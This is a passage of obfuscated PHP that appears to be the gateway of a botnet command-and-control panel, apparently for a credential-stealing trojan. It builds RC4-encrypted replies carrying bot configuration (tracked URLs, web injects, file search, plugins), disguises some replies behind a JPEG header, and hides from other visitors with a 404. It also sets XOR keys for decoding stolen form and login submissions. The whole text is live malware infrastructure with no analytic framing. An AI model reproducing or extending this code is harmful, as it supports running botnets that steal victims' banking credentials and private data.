        if ($response_header_version <= 1800) {
            $hdr_MinorOptions = HDR_RESERVED;
            $response_data = @pack(BOT_RESPONSE_HEADER, $rnd_mm_header, $rnd_mm_exdata, BOT_RESPONSE_HEADER_SIZE, $hdr_StatusCode, $hdr_KnockInterval, $hdr_ContentType, $hdr_Disposition, $hdr_GeneralOptions, $sqlSettings->DynamicConfig_Version, $sqlSettings->DnsList_Version, $sqlSettings->UrlTrack_Version, $sqlSettings->FileSearch_Version, $sqlSettings->Plugins_Version, $sqlSettings->Web_Version, $hdr_MinorOptions, $hdr_ext_cmds_size, $hdr_ext_dns_size, $hdr_ext_tracked_urls_size, $hdr_ext_dyn_config_size, $hdr_ext_filesearch_config_size, $hdr_ext_plugins_config_size, $hdr_ext_web_config_size, 0);
        } else {
            if (1800 < $response_header_version && $response_header_version < 1806) {
                $response_data = @pack(BOT_RESPONSE_HEADERv1801, $rnd_mm_header, $rnd_mm_exdata, BOT_RESPONSE_HEADER_SIZEv1801, $hdr_StatusCode, $hdr_KnockInterval, $hdr_ContentType, $hdr_Disposition, $hdr_GeneralOptions, $hdr_MinorOptions, $hdr_CustomOptions, $sqlSettings->DynamicConfig_Version, $sqlSettings->DnsList_Version, $sqlSettings->UrlTrack_Version, $sqlSettings->FileSearch_Version, $sqlSettings->Plugins_Version, $sqlSettings->Web_Version, HDR_RESERVED, HDR_RESERVED, $hdr_ext_cmds_size, $hdr_ext_dns_size, $hdr_ext_tracked_urls_size, $hdr_ext_dyn_config_size, $hdr_ext_filesearch_config_size, $hdr_ext_plugins_config_size, $hdr_ext_web_config_size, 0);
            } else {
                $response_data = @pack(BOT_RESPONSE_HEADERv1806, $rnd_mm_header, $rnd_mm_exdata, BOT_RESPONSE_HEADER_SIZEv1806, $hdr_StatusCode, $hdr_KnockInterval, $hdr_ContentType, $hdr_Disposition, $hdr_GeneralOptions, $hdr_MinorOptions, $hdr_CustomOptions, $hdr_InfoBlobStatus, $sqlSettings->DynamicConfig_Version, $sqlSettings->DnsList_Version, $sqlSettings->UrlTrack_Version, $sqlSettings->FileSearch_Version, $sqlSettings->Plugins_Version, $sqlSettings->Web_Version, HDR_RESERVED, HDR_RESERVED, $hdr_ext_cmds_size, $hdr_ext_dns_size, $hdr_ext_tracked_urls_size, $hdr_ext_dyn_config_size, $hdr_ext_filesearch_config_size, $hdr_ext_plugins_config_size, $hdr_ext_web_config_size, 0);
            }
        }
        $hdr_rc4_key_part_random1 = @pack("V", $rnd_mm_header);
        $hdr_rc4_key_part_random2 = @pack("V", $rnd_mm_exdata);
        $hdr_rc4_key = BOT_RESPONSE_HEADER_RC4_SALT . $hdr_rc4_key_part_random1;
        $exdata_rc4_key = BOT_RESPONSE_EXDATA_RC4_SALT . $hdr_rc4_key_part_random2;
        if (1700 <= $response_header_version && $response_header_version <= 1800) {
            $hdr_rc4_key = _obfuscated_0D11160D1D0C2E251D35310A151714250C1A330A161301_($hdr_rc4_key, BOT_RESPONSE_HEADER_RC4_SALT_8BIT);
            $exdata_rc4_key = _obfuscated_0D11160D1D0C2E251D35310A151714250C1A330A161301_($exdata_rc4_key, BOT_RESPONSE_EXDATA_RC4_SALT_8BIT);
        } else {
            if (1801 <= $response_header_version) {
                $hdr_rc4_key = _obfuscated_0D11160D1D0C2E251D35310A151714250C1A330A161301_($hdr_rc4_key, BOT_RESPONSE_HEADER_RC4_SALT_8BIT_v1801);
                $exdata_rc4_key = _obfuscated_0D11160D1D0C2E251D35310A151714250C1A330A161301_($exdata_rc4_key, BOT_RESPONSE_EXDATA_RC4_SALT_8BIT_v1801);
            }
        }
        $response_data = @substr($response_data, 0, 8) . RC4Crypt::encrypt($hdr_rc4_key, @substr($response_data, 8, @strlen($response_data) - 8));
        $hdr_extended_data = RC4Crypt::encrypt($exdata_rc4_key, $hdr_extended_data);
        if ($response_header_version <= 1500) {
            echo $jpeg_header;
        }
        echo $response_data;
        echo $hdr_extended_data;
        echo "";
    } else {
        _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(105, "No Content");
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
}
function _obfuscated_0D300A34282E22250415240D132F2D3D145B3E2C1C5B01_()
{
    global $sqlSettings;
    if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_GATEWAY_DISABLED) {
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
}
function _obfuscated_0D281916082D02045C170D172B3C26302B123C29153701_($request_type)
{
    global $iSeed;
    global $g_btPost_FormXorKeys;
    global $g_btPost_LoginXorKeys;
    global $g_btPost_TaskErrorXorKeys;
    global $g_dwPost_LoginCountXorKey;
    global $g_dwPost_LoginCountSubstrValue;
    $response_header_version = 1801;
    $g_btPost_FormXorKeys = array(229, 68, 124, 98);
    $g_btPost_LoginXorKeys = array(152, 86, 225, 15);
    $g_btPost_TaskErrorXorKeys = array(178, 143, 170, 28);
    $g_dwPost_LoginCountXorKey = BOT_REQUEST_LOGINS_COUNT_XOR_KEY_V1801;
    $g_dwPost_LoginCountSubstrValue = 1;
}

?>